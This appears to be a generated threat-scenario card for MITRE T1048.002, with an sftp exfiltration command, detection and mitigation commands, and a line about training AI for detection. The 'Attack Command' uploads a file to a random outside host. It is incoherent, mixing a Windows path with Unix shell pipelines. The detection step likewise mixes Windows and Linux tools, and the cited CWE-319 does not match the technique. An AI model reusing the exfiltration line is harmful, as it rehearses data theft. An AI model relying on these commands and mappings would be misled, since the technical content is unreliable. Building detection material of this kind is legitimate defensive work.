---
type: campaign
scenario_id: 188
tactic: Exfiltration
technique: "T1048.002: Exfiltration Over Asymmetric Encrypted Protocol"
technique_id: T1048.002
tags: [campaign, lotl, exfiltration]
---

# Using sftp to exfiltrate data to remote SFTP server.

## Threat Description
Using sftp to exfiltrate data to remote SFTP server.

## Attack Command
```
echo put C:\$(echo data$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt) | sftp $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)@$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com
```

## Detection Logic
Monitor sftp: `wmic process where name='sftp.exe' get commandline | findstr put`; Monitor SFTP traffic: `netstat -anp | grep :22`.

## Mitigation
Restrict sftp: `icacls %programfiles%\OpenSSH\sftp.exe /deny Everyone:RX`; Block SFTP outbound: `netsh advfirewall firewall add rule name='Block SFTP' dir=out action=block protocol=TCP remoteport=22`.

## AI Training Prompt
Train AI to detect sftp exfiltration and suggest SFTP restrictions.

## References
- MITRE ATT&CK T1048.002: https://attack.mitre.org/techniques/T1048/002/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
